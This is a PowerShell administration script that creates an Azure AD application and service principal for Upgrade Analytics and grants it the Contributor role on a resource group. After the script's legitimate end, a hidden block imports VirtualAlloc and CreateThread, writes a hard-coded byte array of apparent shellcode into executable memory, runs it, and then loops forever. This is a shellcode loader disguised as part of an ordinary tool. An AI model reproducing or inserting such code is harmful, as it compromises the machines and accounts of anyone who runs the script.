﻿
[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, HelpMessage="Name of the Azure AD application to be created.")]
    [ValidateNotNullOrEmpty()]
    [string]$AppDisplayName,

    [parameter(Mandatory=$true, HelpMessage="Name of a Resource Group in Azure that the OMS workspace used for Upgrade Analytics belongs to.")]
    [ValidateNotNullOrEmpty()]
    [string]$ResourceGroupName,

    [parameter(Mandatory=$true, HelpMessage="Azure subscription Id, can be retrieved by running the Get-AzureRmSubscription cmdlet.")]
    [ValidateNotNullOrEmpty()]
    [string]$AzureSubscriptionId
)
Begin {
    
    try {
        Write-Verbose -Message "Aquiring required credentials for logging on to Azure"
        $AzureLogin = Login-AzureRmAccount -ErrorAction Stop
    }
    catch [System.Exception] {
        Write-Warning -Message $_.Exception.Message ; break
    }
}
Process {
    
    function New-SecretKey {
        param(
            [parameter(Mandatory=$true)]
            [int]$Length,

            [parameter(Mandatory=$true)]
            [int]$SpecialCharacters
        )
        try {
            
            Add-Type -AssemblyName "System.Web" -ErrorAction Stop

            
            $Password = [Web.Security.Membership]::GeneratePassword($Length, $SpecialCharacters)

            
            return $Password
        }
        catch [System.Exception] {
            Write-Warning -Message $_.Exception.Message ; break
        }
    }

    
    try {
        Write-Verbose -Message "Validating Azure context"
        $AzureContext = Get-AzureRmContext -ErrorAction Stop
        if ($AzureContext -ne $null) {
            
            Write-Verbose -Message "Attempting to locate subscription for '$($AzureSubscriptionId)'"
            $AzureSubscription = Get-AzureRmSubscription -SubscriptionId $AzureSubscriptionId -ErrorAction Stop
            if ($AzureSubscription -ne $null) {
                
                try {
                    Write-Verbose -Message "Attempting to locate resource group '$($ResourceGroupName)'"
                    $AzureResourceGroup = Get-AzureRmResourceGroup -Name $ResourceGroupName -ErrorAction Stop
                    if ($AzureResourceGroup -ne $null) {
                        
                        try {
                            
                            $AppPassword = New-SecretKey -Length 24 -SpecialCharacters 3

                            Write-Verbose -Message "Creating new Azure AD application '$($AppDisplayName)'"
                            $AADApplicationArgs = @{
                                DisplayName = $AppDisplayName
                                HomePage = "https://localhost:8000"
                                IdentifierUris = "https://localhost:8001"
                                Password = $AppPassword
                                ErrorAction = "Stop"
                            }
                            $AADApplication = New-AzureRmADApplication @AADApplicationArgs
                        }
                        catch [System.Exception] {
                            Write-Warning -Message $_.Exception.Message ; break
                        }

                        
                        try {
                            Write-Verbose -Message "Creating new service principal for application with Id '$($AADApplication.ApplicationId)'"
                            $AADServicePrincipal = New-AzureRmADServicePrincipal -ApplicationId $AADApplication.ApplicationId -ErrorAction Stop
                        }
                        catch [System.Exception] {
                            Write-Warning -Message $_.Exception.Message ; break
                        }
                        
                        
                        try {
                            do {
                                
                                Write-Verbose -Message "Attempting to locate service principal, retry in 15 seconds"
                                $ServicePrincipal = Get-AzureRmADServicePrincipal -ObjectId $AADServicePrincipal.Id

                                
                                Start-Sleep -Seconds 15
                            }
                            while ($ServicePrincipal -eq $null)

                            Write-Verbose -Message "Creating new role assignment between application Id '$($AADApplication.ApplicationId)' and resource group '$($AzureResourceGroup.ResourceGroupName)'"
                            $AzureRoleAssignmentArgs = @{
                                ResourceGroupName = $AzureResourceGroup.ResourceGroupName
                                ServicePrincipalName = $AADApplication.ApplicationId
                                RoleDefinitionName = "Contributor"
                                ErrorAction = "Stop"
                            }
                            $AzureRoleAssignment = New-AzureRmRoleAssignment @AzureRoleAssignmentArgs
                            Write-Verbose -Message "Successfully created Azure AD application and assigned Contributor role for specified resource group"
                        }
                        catch [System.Exception] {
                            Write-Warning -Message $_.Exception.Message ; break
                        }

                        
                        $TenantName = (Get-AzureRmTenant -TenantId $AzureSubscription.TenantId).Domain
                        $ReturnData = [PSCustomObject]@{
                            Tenant = $TenantName
                            ClientID = $AADApplication.ApplicationId
                            SecretKey = $AppPassword
                        }
                        Write-Output -InputObject $ReturnData
                    }
                }
                catch [System.Exception] {
                    Write-Warning -Message $_.Exception.Message ; break
                }
            }
            else {
                Write-Warning -Message "Unable to locate Azure Subscription based of specified Subscription Id" ; break
            }
        }
    }
    catch [System.Exception] {
        Write-Warning -Message $_.Exception.Message ; break
    }
}
$dUa5 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $dUa5 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x60,0x83,0x2c,0x25,0xdb,0xc9,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x4e,0x83,0xee,0xfc,0x31,0x6e,0x10,0x03,0x6e,0x10,0x82,0x76,0xd0,0xcd,0xc0,0x79,0x29,0x0e,0xa4,0xf0,0xcc,0x3f,0xe4,0x67,0x84,0x10,0xd4,0xec,0xc8,0x9c,0x9f,0xa1,0xf8,0x17,0xed,0x6d,0x0e,0x9f,0x5b,0x48,0x21,0x20,0xf7,0xa8,0x20,0xa2,0x05,0xfd,0x82,0x9b,0xc6,0xf0,0xc3,0xdc,0x3a,0xf8,0x96,0xb5,0x31,0xaf,0x06,0xb1,0x0f,0x6c,0xac,0x89,0x9e,0xf4,0x51,0x59,0xa1,0xd5,0xc7,0xd1,0xf8,0xf5,0xe6,0x36,0x71,0xbc,0xf0,0x5b,0xbf,0x76,0x8a,0xa8,0x34,0x89,0x5a,0xe1,0xb5,0x26,0xa3,0xcd,0x44,0x36,0xe3,0xea,0xb6,0x4d,0x1d,0x09,0x4b,0x56,0xda,0x73,0x97,0xd3,0xf9,0xd4,0x5c,0x43,0x26,0xe4,0xb1,0x12,0xad,0xea,0x7e,0x50,0xe9,0xee,0x81,0xb5,0x81,0x0b,0x0a,0x38,0x46,0x9a,0x48,0x1f,0x42,0xc6,0x0b,0x3e,0xd3,0xa2,0xfa,0x3f,0x03,0x0d,0xa3,0xe5,0x4f,0xa0,0xb0,0x97,0x0d,0xad,0x75,0x9a,0xad,0x2d,0x11,0xad,0xde,0x1f,0xbe,0x05,0x49,0x2c,0x37,0x80,0x8e,0x53,0x62,0x74,0x00,0xaa,0x8c,0x85,0x08,0x69,0xd8,0xd5,0x22,0x58,0x60,0xbe,0xb2,0x65,0xb5,0x11,0xe3,0xc9,0x65,0xd2,0x53,0xaa,0xd5,0xba,0xb9,0x25,0x0a,0xda,0xc1,0xef,0x23,0xf3,0x2c,0x10,0x4b,0x04,0x61,0x24,0x78,0x34,0xf1,0x25,0x13,0x55,0xdf,0xc1,0x8f,0xfb,0x6c,0x24,0x21,0x61,0xe7,0x38,0xd5,0xc0,0x2f,0x0d,0xa5,0xec,0xe5,0xe6,0xe5,0x0e,0x6c,0xfc,0xb5,0x46,0x72,0xfe,0x2f,0x9d,0xfb,0x18,0x25,0xb1,0xad,0xb3,0xd1,0x28,0xf4,0x48,0x40,0xb4,0x22,0x35,0x42,0x3e,0xc1,0xc9,0x0c,0xb7,0xac,0xd9,0xf8,0x37,0xfb,0x80,0xae,0x48,0xd1,0xaf,0x4e,0xdd,0xde,0x79,0x19,0x49,0xdd,0x5c,0x6d,0xd6,0x1e,0x8b,0xe6,0xdf,0x8a,0x74,0x90,0x1f,0x5b,0x75,0x60,0x76,0x31,0x75,0x08,0x2e,0x61,0x26,0x2d,0x31,0xbc,0x5a,0xfe,0xa4,0x3f,0x0b,0x53,0x6e,0x28,0xb1,0x8a,0x58,0xf7,0x4a,0xf9,0x58,0xcb,0x9c,0xc7,0x2e,0x25,0x1d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$NCDn=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($NCDn.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$NCDn,0,0,0);for (;;){Start-sleep 60};

